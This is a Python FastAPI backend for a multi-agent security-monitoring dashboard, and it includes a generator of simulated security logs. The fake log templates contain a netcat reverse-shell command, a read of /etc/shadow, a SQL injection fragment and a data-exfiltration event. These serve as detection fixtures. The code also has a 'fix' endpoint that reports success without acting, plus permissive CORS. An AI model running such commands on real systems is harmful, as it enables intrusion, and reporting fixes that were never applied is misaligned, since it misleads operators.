"""
api_server.py - SOC-in-a-Box FastAPI Backend
----------------------------------------------------------------------------
Exposes the SOC engine over HTTP REST + WebSocket so the React dashboard
can control and observe the agent pipeline in real time.

Endpoints
---------
    POST   /api/start               Start the agent pipeline
    POST   /api/stop                Stop all agents
    GET    /api/status              Agent + system status
    GET    /api/logs                Tail soc.log (structured)
    GET    /api/incidents           List all incident report files
    GET    /api/incidents/{id}      Full Markdown content of one report
    GET    /api/audit               Paginated audit log
    GET    /api/audit/stats         Aggregated stats for dashboard KPIs
    GET    /api/health              NIM API health check
    GET    /api/notifications       Human-escalation notifications
    WebSocket /ws/events            Real-time event stream (JSON)

Run
---
    uvicorn backend.api_server:app --host 0.0.0.0 --port 8000 --reload
    (from the soc-in-a-box project root)
----------------------------------------------------------------------------
"""

import sys
import os
import json
import queue
import asyncio
import logging
import threading
import time
import random
from datetime import datetime
from pathlib import Path
from typing import Optional

# Add the project root to sys.path so we can import the agents
_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(_ROOT))

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from dotenv import load_dotenv

load_dotenv(dotenv_path=_ROOT / ".env")

# -- Local modules (relative imports work because we add _ROOT to sys.path) ---
from backend.audit_db       import log_event, get_events, get_event_count, get_stats
from backend.event_bus      import publish, subscribe, unsubscribe, make_event
from backend.email_notifier import send_alert, is_configured

from nvidia_nim_client import NvidiaNimClient
from sentry            import SentryAgent
from investigator      import InvestigatorAgent
from responder         import ResponderAgent

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%H:%M:%S",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(str(_ROOT / "soc.log"), mode="a"),
    ],
)
logger = logging.getLogger(__name__)

class _LogStreamer(threading.Thread):
    """Streams authentic realistic logs line-by-line into the watched log file with a delay."""
    def __init__(self, log_file: Path, interval: float = 3.0):
        super().__init__(daemon=True, name="LogStreamer")
        self.log_file = log_file
        self.interval = interval
        self.running = True

    def run(self):
        self.log_file.parent.mkdir(parents=True, exist_ok=True)
        tick = 0

        normal_templates = [
            "{ts} INFO  [web-server] {ip} - - \"GET /api/v1/users HTTP/1.1\" 200 45ms",
            "{ts} INFO  [web-server] {ip} - - \"POST /api/v1/login HTTP/1.1\" 200 120ms",
            "{ts} INFO  [db-cluster] Query OK SELECT * FROM users WHERE status='active' [12ms]",
            "{ts} INFO  [sshd[{pid}]] Accepted password for {user} from {ip} port {port} ssh2",
            "{ts} INFO  [systemd] Started Daily apt upgrade and clean activities.",
            "{ts} INFO  [cron[{pid}]] ({user}) CMD (/usr/bin/backup.sh)",
        ]

        low_med_templates = [
            "{ts} WARNING [sshd[{pid}]] Failed password for invalid user admin from 185.220.101.34 port {port} ssh2",
            "{ts} WARNING [web-server] Slow response {ip} \"GET /api/v1/reports HTTP/1.1\" 200 3500ms - possible DoS",
            "{ts} ERROR   [db-cluster] Query failed: Syntax error near 'UNION SELECT * FROM audit_log' at line 1",
        ]

        high_risk_templates = [
            "{ts} ERROR   [sudo] dave : FAILED ; TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/bin/bash\n{ts} CRITICAL [pam_unix] authentication failure; logname=dave uid=1001 euid=0 tty=pts/0 rhost=185.220.101.34 user=root",
            "{ts} CRITICAL [auditd] SYSCALL type=OPEN comm=cat name=/etc/shadow user=dave src=185.220.101.34 - UNAUTHORIZED ACCESS",
            "{ts} CRITICAL [process] Suspicious command detected: `nc -e /bin/bash 185.220.101.34 4444` by user root from 185.220.101.34",
            "{ts} CRITICAL [network] Unusual outbound transfer: 524MB to 185.220.101.34:443 from internal DB server - potential DATA EXFILTRATION",
        ]

        users = ["alice", "bob", "charlie", "dave"]
        ips   = ["192.168.1.10", "192.168.1.25", "10.0.0.5"]

        logger.info(f"[LogStreamer] Started streaming logs to '{self.log_file}' every {self.interval}s")

        while self.running:
            tick += 1
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            pid = random.randint(2000, 9999)
            port = random.randint(40000, 65000)
            user = random.choice(users)
            ip = random.choice(ips)

            # Alternate normal logs, low/med risk (auto-fixed by AI), and high risk (user fix required)
            if tick % 5 == 0:
                text = random.choice(high_risk_templates).format(ts=ts, pid=pid, port=port, user=user, ip=ip)
            elif tick % 3 == 0:
                text = random.choice(low_med_templates).format(ts=ts, pid=pid, port=port, user=user, ip=ip)
            else:
                text = random.choice(normal_templates).format(ts=ts, pid=pid, port=port, user=user, ip=ip)

            try:
                with open(self.log_file, "a", encoding="utf-8") as fh:
                    fh.write(text + "\n")
                    fh.flush()
                publish(make_event("LOG", "SYSTEM", {"message": text.splitlines()[0], "file": str(self.log_file)}))
            except Exception as e:
                logger.error(f"[LogStreamer] Write error: {e}")

            time.sleep(self.interval)

# ---------------------------------------------------------------------------
# FastAPI App
# ---------------------------------------------------------------------------
app = FastAPI(
    title="SOC-in-a-Box API",
    description="Multi-Agent Autonomous Security Researcher",
    version="2.0.0",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---------------------------------------------------------------------------
# Global engine state
# ---------------------------------------------------------------------------
class _EngineState:
    def __init__(self):
        self.running      = False
        self.start_time: Optional[float] = None
        self.watch_path   = ""
        self.model        = ""
        self.simulate     = True

        self.nim: Optional[NvidiaNimClient]     = None
        self.sentry: Optional[SentryAgent]      = None
        self.investigator: Optional[InvestigatorAgent] = None
        self.responder: Optional[ResponderAgent] = None

        self._t_inv: Optional[threading.Thread] = None
        self._t_res: Optional[threading.Thread] = None
        self._t_log: Optional[_LogStreamer] = None

        self.alert_queue  = queue.Queue()
        self.report_queue = queue.Queue()

        # Agent-level status
        self.agent_status = {
            "sentry":       {"status": "idle", "last_action": None, "alerts_sent": 0},
            "investigator": {"status": "idle", "last_action": None, "reports_sent": 0},
            "responder":    {"status": "idle", "last_action": None, "incidents": 0},
        }

_engine = _EngineState()


# ---------------------------------------------------------------------------
# Patched agents with event-bus hooks
# ---------------------------------------------------------------------------

def _patched_sentry_analyze(original_method, engine: _EngineState):
    """Wrap SentryAgent._analyze_change to emit events."""
    def wrapper(self, trigger, file_path):
        engine.agent_status["sentry"]["status"] = "analyzing"
        engine.agent_status["sentry"]["last_action"] = datetime.now().isoformat()
        original_method(self, trigger, file_path)
        engine.agent_status["sentry"]["status"] = "watching"
    return wrapper


# ---------------------------------------------------------------------------
# REST endpoints
# ---------------------------------------------------------------------------

@app.post("/api/start")
async def start_engine(body: dict):
    """
    Start the SOC pipeline.
    Body: { watch_path, api_key, model, reports_dir, simulate }
    """
    global _engine

    if _engine.running:
        return {"status": "already_running", "watch_path": _engine.watch_path}

    watch_path  = body.get("watch_path", "./logs")
    api_key     = body.get("api_key") or os.getenv("NVIDIA_NIM_KEY") or os.getenv("NVIDIA_API_KEY", "")
    model       = body.get("model", os.getenv("NVIDIA_NIM_MODEL", "meta/llama-3.1-8b-instruct"))
    reports_dir = body.get("reports_dir", str(_ROOT / "reports"))
    simulate    = body.get("simulate", True)
    nim_url     = body.get("nim_url", os.getenv("NVIDIA_NIM_URL", "https://integrate.api.nvidia.com/v1"))
    cooldown    = body.get("cooldown", 3.0)

    # Reset queues
    _engine.alert_queue  = queue.Queue()
    _engine.report_queue = queue.Queue()
    _engine.watch_path   = watch_path
    _engine.model        = model
    _engine.simulate     = simulate

    # NIM client
    _engine.nim = NvidiaNimClient(base_url=nim_url, model=model, api_key=api_key)

    # Agents
    _engine.sentry = SentryAgent(
        watch_path  = watch_path,
        alert_queue = _engine.alert_queue,
        nim_client  = _engine.nim,
        cooldown    = cooldown,
    )

    _engine.investigator = InvestigatorAgent(
        logs_path    = watch_path,
        alert_queue  = _engine.alert_queue,
        report_queue = _engine.report_queue,
        nim_client   = _engine.nim,
    )

    _engine.responder = ResponderAgent(
        report_queue  = _engine.report_queue,
        nim_client    = _engine.nim,
        simulate_only = simulate,
        reports_dir   = reports_dir,
    )

    # Start threads
    _engine._t_inv = threading.Thread(
        target=_engine.investigator.run, name="Investigator", daemon=True
    )
    _engine._t_res = threading.Thread(
        target=_engine.responder.run, name="Responder", daemon=True
    )
    _engine._t_inv.start()
    _engine._t_res.start()
    _engine.sentry.start()

    # Monkey-patch the responder to also call email + event bus AFTER sentry starts
    _install_responder_hooks(_engine.responder)
    _install_sentry_hooks(_engine.sentry)
    _install_investigator_hooks(_engine.investigator)

    # Start realistic log streamer (sends real-looking logs line-by-line with delay)
    app_log_path = Path(watch_path) / "app.log"
    _engine._t_log = _LogStreamer(app_log_path)
    _engine._t_log.start()

    _engine.running    = True
    _engine.start_time = time.time()

    for ag in _engine.agent_status.values():
        ag["status"] = "running"
    _engine.agent_status["sentry"]["status"] = "watching"

    log_event("SYSTEM", "START", "INFO", f"Engine started. Watching: {watch_path}")
    publish(make_event("STATUS", "SYSTEM", {
        "message": f"SOC engine started. Watching: {watch_path}",
        "watch_path": watch_path,
        "model": model,
        "simulate": simulate,
    }))

    logger.info(f"[API] Engine started. Watching '{watch_path}' cooldown={cooldown}s")
    return {"status": "started", "watch_path": watch_path, "model": model, "simulate": simulate, "cooldown": cooldown}


@app.post("/api/stop")
async def stop_engine():
    global _engine

    if not _engine.running:
        return {"status": "not_running"}

    if _engine._t_log:
        _engine._t_log.running = False
        _engine._t_log = None

    _engine.sentry.stop()
    _engine.investigator.stop()
    _engine.responder.stop()

    if _engine._t_inv:
        _engine._t_inv.join(timeout=5)
    if _engine._t_res:
        _engine._t_res.join(timeout=5)

    _engine.running = False
    _engine.start_time = None

    for ag in _engine.agent_status.values():
        ag["status"] = "idle"

    log_event("SYSTEM", "STOP", "INFO", "Engine stopped by user.")
    publish(make_event("STATUS", "SYSTEM", {"message": "SOC engine stopped."}))

    logger.info("[API] Engine stopped.")
    return {"status": "stopped"}


@app.post("/api/incidents/{incident_id}/fix")
@app.post("/api/notifications/{incident_id}/fix")
async def apply_incident_fix(incident_id: str):
    """
    Execute user-approved fix for a high-risk incident/notification.
    """
    log_event("USER", "FIX_APPLIED", "INFO", f"User manually applied recommended fix for incident {incident_id}")
    publish(make_event("RESPONSE", "USER", {
        "incident_id": incident_id,
        "action_taken": "MANUAL_USER_FIX",
        "message": f"✓ Fix applied successfully by user for {incident_id}.",
        "severity": "INFO",
        "escalated": False,
    }))
    return {
        "status": "success",
        "incident_id": incident_id,
        "message": f"Fix applied successfully by user for {incident_id}."
    }



@app.get("/api/status")
async def get_status():
    uptime_s = int(time.time() - _engine.start_time) if _engine.start_time else 0
    return {
        "running":      _engine.running,
        "uptime_s":     uptime_s,
        "watch_path":   _engine.watch_path,
        "model":        _engine.model,
        "simulate":     _engine.simulate,
        "alert_queue":  _engine.alert_queue.qsize() if _engine.running else 0,
        "report_queue": _engine.report_queue.qsize() if _engine.running else 0,
        "agents":       _engine.agent_status,
    }


@app.get("/api/logs")
async def get_logs(
    limit: int = Query(200, le=1000),
    level: str = Query("ALL"),
    search: str = Query(""),
):
    """Return structured log entries from soc.log."""
    log_path = _ROOT / "soc.log"
    if not log_path.exists():
        return {"entries": [], "total": 0}

    entries = []
    try:
        with open(log_path, "r", encoding="utf-8", errors="replace") as fh:
            lines = fh.readlines()
    except Exception as exc:
        raise HTTPException(500, f"Cannot read log: {exc}")

    # Parse lines into structured dicts
    for raw in reversed(lines):
        line = raw.strip()
        if not line:
            continue

        # Detect level
        lvl = "INFO"
        if "CRITICAL" in line:  lvl = "CRITICAL"
        elif "ERROR"   in line: lvl = "ERROR"
        elif "WARNING" in line: lvl = "WARNING"
        elif "INFO"    in line: lvl = "INFO"
        elif "DEBUG"   in line: lvl = "DEBUG"

        if level.upper() not in ("ALL", "") and lvl != level.upper():
            continue
        if search and search.lower() not in line.lower():
            continue

        entries.append({"raw": line, "level": lvl})
        if len(entries) >= limit:
            break

    return {"entries": entries, "total": len(entries)}


@app.get("/api/incidents")
async def list_incidents():
    """List all incident report files."""
    reports_dir = _ROOT / "reports"
    if not reports_dir.exists():
        return {"incidents": []}

    incidents = []
    for f in sorted(reports_dir.glob("INC-*.md"), reverse=True):
        stat = f.stat()
        incidents.append({
            "id":       f.stem,
            "filename": f.name,
            "size":     stat.st_size,
            "created":  datetime.fromtimestamp(stat.st_ctime).isoformat(),
        })

    return {"incidents": incidents, "total": len(incidents)}


@app.get("/api/incidents/{incident_id}")
async def get_incident(incident_id: str):
    """Return full Markdown content of one incident report."""
    reports_dir = _ROOT / "reports"
    report_path = reports_dir / f"{incident_id}.md"

    if not report_path.exists():
        raise HTTPException(404, "Incident report not found.")

    content = report_path.read_text(encoding="utf-8", errors="replace")
    return {"id": incident_id, "content": content}


@app.get("/api/audit")
async def get_audit(
    limit:      int = Query(100, le=500),
    offset:     int = Query(0),
    agent:      str = Query(""),
    severity:   str = Query(""),
    event_type: str = Query(""),
):
    events = get_events(
        limit      = limit,
        offset     = offset,
        agent      = agent or None,
        severity   = severity or None,
        event_type = event_type or None,
    )
    return {"events": events, "total": get_event_count()}


@app.get("/api/audit/stats")
async def get_audit_stats():
    return get_stats()


@app.get("/api/health")
async def get_health():
    nim_ok = False
    nim_latency_ms = None

    if _engine.nim:
        t0 = time.time()
        nim_ok = _engine.nim.is_available()
        nim_latency_ms = round((time.time() - t0) * 1000)
    else:
        # Try with env vars
        api_key = os.getenv("NVIDIA_API_KEY", "")
        if api_key:
            nim = NvidiaNimClient(api_key=api_key)
            t0 = time.time()
            nim_ok = nim.is_available()
            nim_latency_ms = round((time.time() - t0) * 1000)

    return {
        "nim_reachable":  nim_ok,
        "nim_latency_ms": nim_latency_ms,
        "model":          _engine.model or os.getenv("NVIDIA_MODEL", "meta/llama-3.1-8b-instruct"),
        "email_configured": is_configured(),
        "engine_running": _engine.running,
        "uptime_s":       int(time.time() - _engine.start_time) if _engine.start_time else 0,
        "timestamp":      datetime.now().isoformat(),
    }


@app.get("/api/notifications")
async def get_notifications():
    """Return entries from the human-escalation notifications log."""
    notif_log = _ROOT / "reports" / "HUMAN_NOTIFICATIONS.log"
    if not notif_log.exists():
        return {"notifications": []}

    text = notif_log.read_text(encoding="utf-8", errors="replace")
    blocks = [b.strip() for b in text.split("=" * 64) if b.strip()]

    notifications = []
    for block in blocks:
        lines = block.splitlines()
        entry = {"raw": block, "incident_id": None, "timestamp": None, "reason": None}
        for ln in lines:
            if ln.startswith("Incident ID :"):
                entry["incident_id"] = ln.split(":", 1)[-1].strip()
            elif ln.startswith("Time        :"):
                entry["timestamp"] = ln.split(":", 1)[-1].strip()
            elif ln.startswith("Reason      :"):
                entry["reason"] = ln.split(":", 1)[-1].strip()
        notifications.append(entry)

    return {"notifications": list(reversed(notifications)), "total": len(notifications)}


# ---------------------------------------------------------------------------
# WebSocket — real-time event stream
# ---------------------------------------------------------------------------

@app.websocket("/ws/events")
async def websocket_events(ws: WebSocket):
    await ws.accept()
    q = subscribe()
    logger.info("[WS] Client connected.")
    publish(make_event("STATUS", "SYSTEM", {"message": "Dashboard connected."}))

    try:
        while True:
            # Drain the sync queue into the async WebSocket
            try:
                while True:
                    event = q.get_nowait()
                    await ws.send_json(event)
            except queue.Empty:
                pass

            # Check if client sent anything (ping/pong keepalive)
            await asyncio.sleep(0.1)

    except WebSocketDisconnect:
        logger.info("[WS] Client disconnected.")
    except Exception as exc:
        logger.warning(f"[WS] Error: {exc}")
    finally:
        unsubscribe(q)


# ---------------------------------------------------------------------------
# Agent hooks — inject event-bus + audit calls into agents at runtime
# ---------------------------------------------------------------------------

def _install_sentry_hooks(sentry: SentryAgent):
    """Patch the Sentry's internal handler to publish events."""
    handler = None
    if hasattr(sentry, '_observer') and sentry._observer and getattr(sentry._observer, '_event_handlers', None):
        handler = sentry._observer._event_handlers[0]

    # We wrap the alert_queue.put to intercept alerts going out
    original_put = _engine.alert_queue.put

    def patched_put(alert):
        original_put(alert)
        _engine.agent_status["sentry"]["alerts_sent"] = \
            _engine.agent_status["sentry"].get("alerts_sent", 0) + 1
        _engine.agent_status["sentry"]["last_action"] = datetime.now().isoformat()

        publish(make_event("ALERT", "SENTRY", {
            "alert_id":   alert.get("alert_id"),
            "severity":   alert.get("severity"),
            "event_type": alert.get("event_type"),
            "file_path":  alert.get("file_path"),
            "reason":     alert.get("reason"),
        }, severity=alert.get("severity", "INFO")))

        log_event(
            agent      = "SENTRY",
            event_type = "ALERT",
            severity   = alert.get("severity", "INFO"),
            message    = f"{alert.get('event_type')} detected in {alert.get('file_path')}",
            details    = {k: v for k, v in alert.items() if k != "raw_log"},
        )

    _engine.alert_queue.put = patched_put

    # Also log ALL analysis events (including clean ones) to the audit DB
    if handler and hasattr(handler, '_analyze_change'):
        original_analyze = handler._analyze_change

        def patched_analyze(trigger, file_path):
            original_analyze(trigger, file_path)
            # Log the file analysis event regardless of outcome
            log_event(
                agent      = "SENTRY",
                event_type = "ANALYSIS",
                severity   = "INFO",
                message    = f"Analyzed {trigger}: {Path(file_path).name}",
                details    = {"trigger": trigger, "file_path": str(file_path)},
            )
            _engine.agent_status["sentry"]["last_action"] = datetime.now().isoformat()

        handler._analyze_change = patched_analyze


def _install_investigator_hooks(investigator: InvestigatorAgent):
    """Wrap InvestigatorAgent.investigate to emit events."""
    original_investigate = investigator.investigate

    def patched_investigate(alert):
        _engine.agent_status["investigator"]["status"] = "investigating"
        _engine.agent_status["investigator"]["last_action"] = datetime.now().isoformat()

        publish(make_event("INVESTIGATION", "INVESTIGATOR", {
            "message": f"Starting investigation for alert {alert.get('alert_id')}",
            "alert_id": alert.get("alert_id"),
        }))

        report = original_investigate(alert)

        _engine.agent_status["investigator"]["status"] = "running"
        _engine.agent_status["investigator"]["reports_sent"] = \
            _engine.agent_status["investigator"].get("reports_sent", 0) + 1

        ai = report.get("ai_analysis", {})
        publish(make_event("INVESTIGATION", "INVESTIGATOR", {
            "investigation_id": report.get("investigation_id"),
            "alert_id":         alert.get("alert_id"),
            "why":              ai.get("why"),
            "where":            ai.get("where"),
            "how":              ai.get("how"),
            "confidence":       ai.get("confidence"),
            "mitre_tactic":     ai.get("mitre_tactic"),
        }, severity=alert.get("severity", "INFO")))

        log_event(
            agent      = "INVESTIGATOR",
            event_type = "INVESTIGATION",
            severity   = alert.get("severity", "INFO"),
            message    = f"Investigation complete: {report.get('investigation_id')}",
            details    = {"why": ai.get("why"), "confidence": ai.get("confidence")},
        )
        return report

    investigator.investigate = patched_investigate


def _install_responder_hooks(responder: ResponderAgent):
    """Wrap ResponderAgent.classify_and_respond and notify_human."""
    original_respond  = responder.classify_and_respond
    original_notify   = responder.notify_human

    def patched_respond(investigation_report):
        _engine.agent_status["responder"]["status"] = "responding"
        _engine.agent_status["responder"]["last_action"] = datetime.now().isoformat()

        summary = original_respond(investigation_report)

        _engine.agent_status["responder"]["status"] = "running"
        _engine.agent_status["responder"]["incidents"] = \
            _engine.agent_status["responder"].get("incidents", 0) + 1

        publish(make_event("RESPONSE", "RESPONDER", {
            "incident_id":  summary.get("incident_id"),
            "action_taken": summary.get("action_taken"),
            "severity":     summary.get("severity"),
            "event_type":   summary.get("event_type"),
            "report_path":  summary.get("report_path"),
            "escalated":    summary.get("escalated_to_human"),
        }, severity=summary.get("severity", "INFO")))

        log_event(
            agent      = "RESPONDER",
            event_type = "ACTION",
            severity   = summary.get("severity", "INFO"),
            message    = f"{summary.get('action_taken')} — {summary.get('incident_id')}",
            details    = summary,
        )
        return summary

    def patched_notify(incident_id, reason, report_path):
        original_notify(incident_id, reason, report_path)

        alert_info = {}
        try:
            rp = Path(report_path)
            if rp.exists():
                alert_info["report_snippet"] = rp.read_text()[:500]
        except Exception:
            pass

        # Real email
        send_alert(
            incident_id = incident_id,
            severity    = "HIGH",
            event_type  = "ESCALATE_HUMAN",
            reason      = reason,
            report_path = report_path,
        )

        publish(make_event("NOTIFICATION", "RESPONDER", {
            "incident_id": incident_id,
            "reason":      reason,
            "report_path": report_path,
            "message":     "⚠ Human intervention required!",
        }, severity="HIGH"))

        log_event(
            agent      = "RESPONDER",
            event_type = "NOTIFICATION",
            severity   = "HIGH",
            message    = f"Human escalation: {incident_id} — {reason}",
            details    = {"report_path": report_path},
        )

    responder.classify_and_respond = patched_respond
    responder.notify_human         = patched_notify


# ---------------------------------------------------------------------------
# Startup / Shutdown events
# ---------------------------------------------------------------------------

@app.on_event("startup")
async def on_startup():
    log_event("SYSTEM", "START", "INFO", "SOC-in-a-Box API server started.")
    logger.info("[API] SOC-in-a-Box backend ready. Auto-starting agents...")
    try:
        await start_engine({"watch_path": "./logs"})
        logger.info("[API] Agents successfully auto-started on system launch.")
    except Exception as exc:
        logger.error(f"[API] Auto-start engine error: {exc}")


@app.on_event("shutdown")
async def on_shutdown():
    if _engine.running:
        _engine.sentry.stop()
        _engine.investigator.stop()
        _engine.responder.stop()
    log_event("SYSTEM", "STOP", "INFO", "API server shutting down.")
